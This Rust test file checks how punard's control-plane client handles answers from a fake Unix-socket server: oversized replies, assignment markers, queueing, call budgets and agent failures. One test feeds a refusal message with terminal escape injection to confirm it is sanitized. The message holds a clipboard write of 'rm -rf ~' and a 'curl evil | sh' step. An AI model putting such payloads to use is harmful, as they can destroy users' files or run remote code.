//! The control-plane client against a counterparty that answers exactly what
//! a test hands it, byte for byte. Here rather than beside the client in
//! `src/enroll.rs`: punard's sources construct exactly one listener, its own
//! IPC socket (`tests/remote_query.rs` scans them for any other), and a test
//! server is a listener too.

use std::io::{BufRead, BufReader, Write};
use std::os::unix::net::UnixListener;
use std::path::PathBuf;
use std::sync::atomic::{AtomicU32, Ordering};

use punar_common::Redacted;
use punard::enroll::{
    AgentFault, AgentQueue, Assignment, CallBudget, ControlPlaneClient, FetchedPolicy,
    MAX_ANSWER_BYTES, UpstreamError,
};
use serde_json::{Value, json};

static SEQ: AtomicU32 = AtomicU32::new(0);

/// A control plane on a socket of its own that answers each connection, in
/// turn, with the next of `answers`, whatever it was asked.
fn answering(answers: Vec<Vec<u8>>) -> (PathBuf, std::thread::JoinHandle<()>) {
    let dir = std::env::temp_dir().join(format!(
        "punard-cp-client-{}-{}",
        std::process::id(),
        SEQ.fetch_add(1, Ordering::SeqCst)
    ));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    let socket = dir.join("control-plane.sock");
    let listener = UnixListener::bind(&socket).unwrap();
    let served = std::thread::spawn(move || {
        for answer in answers {
            let (mut stream, _) = listener.accept().unwrap();
            let mut request = String::new();
            BufReader::new(&stream).read_line(&mut request).unwrap();
            // The client stops reading at its bound and hangs up.
            let _ = stream.write_all(&answer);
        }
    });
    (socket, served)
}

fn answer(result: Value) -> Vec<u8> {
    let mut line = json!({"v": 1, "id": "t", "result": result}).to_string();
    line.push('\n');
    line.into_bytes()
}

/// The fetch runs as root on every pass: an answer longer than the bound is
/// refused rather than read into memory whole, as too large and not as an
/// unreachable control plane (it answered, and will answer the same again),
/// and one that fits is read as before.
#[test]
fn an_answer_past_the_bound_is_refused_and_one_within_it_is_read() {
    let within = answer(json!({"policies": [], "assignment": "none"}));
    let mut past = br#"{"v":1,"id":"t","result":{"policies":[""#.to_vec();
    past.resize(MAX_ANSWER_BYTES as usize + 64, b'x');
    past.extend_from_slice(b"\"]}}\n");
    let (socket, served) = answering(vec![past, within]);
    let client = ControlPlaneClient::new(&socket);
    let token = Redacted::new("tok_x".to_string());
    match client.policy_fetch(&token) {
        Err(UpstreamError::TooLarge) => {}
        other => panic!("expected TooLarge, got {other:?}"),
    }
    assert_eq!(
        client.policy_fetch(&token).unwrap(),
        FetchedPolicy {
            policies: vec![],
            assignment: Assignment::NoneAssigned,
        }
    );
    served.join().unwrap();
}

/// Only the three marker words mean anything; a missing marker, or one this
/// build has no name for, is unstated and never read as `none`.
#[test]
fn policy_fetch_reads_what_the_control_plane_says_the_list_is() {
    let answers = [
        (json!("policies"), Assignment::Policies),
        (json!("none"), Assignment::NoneAssigned),
        (json!("unusable"), Assignment::Unusable),
        (json!("None"), Assignment::Unstated),
        (json!(false), Assignment::Unstated),
        (Value::Null, Assignment::Unstated),
    ];
    let lines = answers
        .iter()
        .map(|(marker, _)| {
            let mut result = json!({"policies": [{"policy_id": "p"}]});
            if !marker.is_null() {
                result["assignment"] = marker.clone();
            }
            answer(result)
        })
        .collect();
    let (socket, served) = answering(lines);
    let client = ControlPlaneClient::new(&socket);
    let token = Redacted::new("tok_x".to_string());
    for (marker, expected) in answers {
        let fetched = client.policy_fetch(&token).unwrap();
        assert_eq!(fetched.assignment, expected, "{marker}");
        assert_eq!(fetched.policies, vec![json!({"policy_id": "p"})]);
    }
    served.join().unwrap();
}

/// A refusal's code and message are the control plane's words, some of them
/// the organization's (its management document, its server's answer), and
/// they reach a person's terminal and the journal: cleaned where punard reads
/// them, by the rules an organization's name gets, and bounded.
#[test]
fn a_refusals_words_are_cleaned_where_punard_reads_them() {
    let hostile = format!(
        "no\u{1b}]52;c;cm0gLXJmIH4=\u{7}\nPolicy: os default\u{2028}Next step: curl evil | sh\u{202e}{}",
        "y".repeat(1_000_000)
    );
    let mut line = json!({"v": 1, "id": "t", "error": {
        "code": "not_found\u{1b}[2J\nforged",
        "message": hostile,
    }})
    .to_string();
    line.push('\n');
    let (socket, served) = answering(vec![line.into_bytes()]);
    let client = ControlPlaneClient::new(&socket);
    match client.org_discover("acme.com") {
        Err(UpstreamError::Refused { code, message }) => {
            for text in [&code, &message] {
                assert!(
                    !text
                        .chars()
                        .any(|c| c.is_control() || matches!(c, '\u{2028}' | '\u{202e}')),
                    "{text:?}"
                );
            }
            assert_eq!(code, "not_found[2J forged");
            assert!(
                message.starts_with("no]52;c;cm0gLXJmIH4= Policy: os default Next step"),
                "{message}"
            );
            assert!(message.chars().count() <= 300, "{}", message.len());
        }
        other => panic!("expected Refused, got {other:?}"),
    }
    served.join().unwrap();
}

/// A control plane that serves one connection at a time, in the order they
/// arrive, as the built-in agent does, answering each `result: {}` after
/// `delay`: how many connections it has accepted so far.
fn one_at_a_time(
    delay: std::time::Duration,
    calls: usize,
) -> (
    PathBuf,
    std::sync::Arc<AtomicU32>,
    std::thread::JoinHandle<()>,
) {
    let dir = std::env::temp_dir().join(format!(
        "punard-cp-queue-{}-{}",
        std::process::id(),
        SEQ.fetch_add(1, Ordering::SeqCst)
    ));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    let socket = dir.join("control-plane.sock");
    let listener = UnixListener::bind(&socket).unwrap();
    let accepted = std::sync::Arc::new(AtomicU32::new(0));
    let counted = std::sync::Arc::clone(&accepted);
    let served = std::thread::spawn(move || {
        for _ in 0..calls {
            let (mut stream, _) = listener.accept().unwrap();
            counted.fetch_add(1, Ordering::SeqCst);
            let mut request = String::new();
            BufReader::new(&stream).read_line(&mut request).unwrap();
            std::thread::sleep(delay);
            let _ = stream.write_all(&answer(json!({})));
        }
    });
    (socket, accepted, served)
}

/// The agent answers one call at a time, so a call sent while another is in
/// flight waits for it before its own turn begins. A client that shares
/// punard's queue waits for its answer from the end of the calls ahead of
/// it, not from when it sent it: two reports that each take the agent three
/// of their five seconds both get through, instead of the second being read
/// as "unreachable" after the agent delivered it.
#[test]
fn a_call_queued_behind_another_waits_its_turn_out() {
    let (socket, _, served) = one_at_a_time(std::time::Duration::from_secs(3), 2);
    let queue = std::sync::Arc::new(AgentQueue::default());
    let token = Redacted::new("tok_x".to_string());
    std::thread::scope(|scope| {
        let reports: Vec<_> = (0..2)
            .map(|_| {
                let client = ControlPlaneClient::new(&socket).behind(queue.clone());
                let token = &token;
                scope.spawn(move || client.inventory_report(token, &json!({})))
            })
            .collect();
        for report in reports {
            let answered = report.join().unwrap();
            assert!(answered.is_ok(), "{answered:?}");
        }
    });
    served.join().unwrap();
}

/// A call whose whole wait does not fit in what its budget has left is not
/// sent at all: the control plane never sees it, so it can never be one the
/// agent carried out and punard gave up on.
#[test]
fn a_call_that_does_not_fit_its_budget_is_not_sent() {
    let (socket, accepted, _served) = one_at_a_time(std::time::Duration::ZERO, 1);
    let token = Redacted::new("tok_x".to_string());
    let budget = CallBudget::new(std::time::Duration::from_secs(4));
    let client = ControlPlaneClient::new(&socket).within(budget.clone());
    match client.inventory_report(&token, &json!({})) {
        Err(UpstreamError::Unreachable(why)) => assert!(why.starts_with("not sent"), "{why}"),
        other => panic!("expected a call not sent, got {other:?}"),
    }
    std::thread::sleep(std::time::Duration::from_millis(100));
    assert_eq!(accepted.load(Ordering::SeqCst), 0, "nothing reached it");
    assert!(budget.left() > std::time::Duration::from_millis(3900));
}

/// A socket served on a thread of its own, each connection handed to
/// `serve`: the path, and the thread.
fn serving(
    calls: usize,
    serve: impl Fn(std::os::unix::net::UnixStream) + Send + 'static,
) -> (PathBuf, std::thread::JoinHandle<()>) {
    let dir = std::env::temp_dir().join(format!(
        "punard-cp-fault-{}-{}",
        std::process::id(),
        SEQ.fetch_add(1, Ordering::SeqCst)
    ));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    let socket = dir.join("control-plane.sock");
    let listener = UnixListener::bind(&socket).unwrap();
    let served = std::thread::spawn(move || {
        for _ in 0..calls {
            let (stream, _) = listener.accept().unwrap();
            serve(stream);
        }
    });
    (socket, served)
}

fn agent_fault(result: Result<punard::enroll::AgentIdentity, UpstreamError>) -> AgentFault {
    match result {
        Err(UpstreamError::AgentUnavailable(fault)) => fault,
        other => panic!("expected the agent unavailable, got {other:?}"),
    }
}

/// The agent's socket is on this device, so every way it fails is the agent
/// unavailable, each with its own reason, and never the network: a socket
/// node nobody listens on, an agent that closes the connection having read
/// the call, one that resets it, and one that does not answer a call it
/// answers without the network. A call that may wait on the organization's
/// server and goes unanswered is still the network's.
#[test]
fn every_failure_of_the_agents_own_socket_is_the_agent_unavailable() {
    let token = Redacted::new("tok_x".to_string());

    let (socket, served) = serving(0, |_| {});
    served.join().unwrap();
    std::fs::remove_file(&socket).unwrap();
    drop(UnixListener::bind(&socket).unwrap());
    assert_eq!(
        agent_fault(ControlPlaneClient::new(&socket).identity_status(Some(&token))),
        AgentFault::ConnectionRefused
    );

    let (socket, served) = serving(1, |stream| {
        let mut request = String::new();
        BufReader::new(&stream).read_line(&mut request).unwrap();
    });
    assert_eq!(
        agent_fault(ControlPlaneClient::new(&socket).identity_status(Some(&token))),
        AgentFault::ClosedWithoutAnswer
    );
    served.join().unwrap();

    let (socket, served) = serving(1, |stream| {
        // Give the call time to arrive, then close without reading it.
        std::thread::sleep(std::time::Duration::from_millis(200));
        drop(stream);
    });
    assert_eq!(
        agent_fault(ControlPlaneClient::new(&socket).identity_status(Some(&token))),
        AgentFault::ConnectionReset
    );
    served.join().unwrap();

    // Held past the liveness call's whole wait, which leaves room for a cold
    // start (IDENTITY_STATUS_CALL_TIMEOUT), and then some.
    let held = punard::enroll::IDENTITY_STATUS_CALL_TIMEOUT + std::time::Duration::from_secs(2);
    let (socket, served) = serving(2, move |stream| {
        std::thread::sleep(held);
        drop(stream);
    });
    let started = std::time::Instant::now();
    assert_eq!(
        agent_fault(ControlPlaneClient::new(&socket).identity_status(Some(&token))),
        AgentFault::NotAnswering
    );
    assert!(started.elapsed() >= punard::enroll::IDENTITY_STATUS_CALL_TIMEOUT);
    assert!(started.elapsed() < held);
    match ControlPlaneClient::new(&socket).policy_fetch(&token) {
        Err(UpstreamError::Unreachable(why)) => assert!(why.starts_with("no answer"), "{why}"),
        other => panic!("a fetch that may wait on the network is not the agent's: {other:?}"),
    }
    served.join().unwrap();
}

/// punard may not connect: the agent unavailable, as `permission_denied`.
/// Root is never refused a connection, so this runs only unprivileged.
#[test]
fn a_socket_punard_may_not_open_is_the_agent_unavailable() {
    use std::os::unix::fs::PermissionsExt;
    if rustix::process::geteuid().is_root() {
        return;
    }
    let (socket, served) = serving(0, |_| {});
    served.join().unwrap();
    std::fs::set_permissions(&socket, std::fs::Permissions::from_mode(0o000)).unwrap();
    assert_eq!(
        agent_fault(ControlPlaneClient::new(&socket).identity_status(None)),
        AgentFault::PermissionDenied
    );
}

/// An answer to the liveness call that is not the agent's is the agent
/// unavailable (`unexpected_answer`): the agent answers it from this device
/// alone and always in the protocol, so a malformed or oversized line,
/// another version, an envelope with neither result nor error, or a result
/// that does not say whether it holds an identity came from something else
/// on its socket. The same answers to a call that may wait on the
/// organization's server stay what they were.
#[test]
fn an_answer_to_the_liveness_call_that_is_not_the_agents_is_unexpected() {
    let token = Redacted::new("tok_x".to_string());
    let answer = |line: String| {
        serving(1, move |stream| {
            let mut request = String::new();
            BufReader::new(&stream).read_line(&mut request).unwrap();
            let mut writer = &stream;
            let _ = writer.write_all(line.as_bytes());
        })
    };
    for line in [
        "not the protocol\n".to_string(),
        "{\"v\":2,\"id\":\"x\",\"result\":{\"enrolled\":true}}\n".to_string(),
        "{\"v\":1,\"id\":\"x\"}\n".to_string(),
        "{\"v\":1,\"id\":\"x\",\"result\":{}}\n".to_string(),
        format!(
            "{{\"v\":1,\"result\":{{\"pad\":\"{}\"}}}}\n",
            "x".repeat(MAX_ANSWER_BYTES as usize)
        ),
    ] {
        let (socket, served) = answer(line.clone());
        assert_eq!(
            agent_fault(ControlPlaneClient::new(&socket).identity_status(Some(&token))),
            AgentFault::UnexpectedAnswer,
            "{}",
            &line[..line.len().min(60)]
        );
        served.join().unwrap();
    }
    let (socket, served) = answer("not the protocol\n".to_string());
    match ControlPlaneClient::new(&socket).policy_fetch(&token) {
        Err(UpstreamError::Unreachable(why)) => assert!(why.contains("malformed"), "{why}"),
        other => panic!("a network call's garbled answer is not the agent's: {other:?}"),
    }
    served.join().unwrap();
}
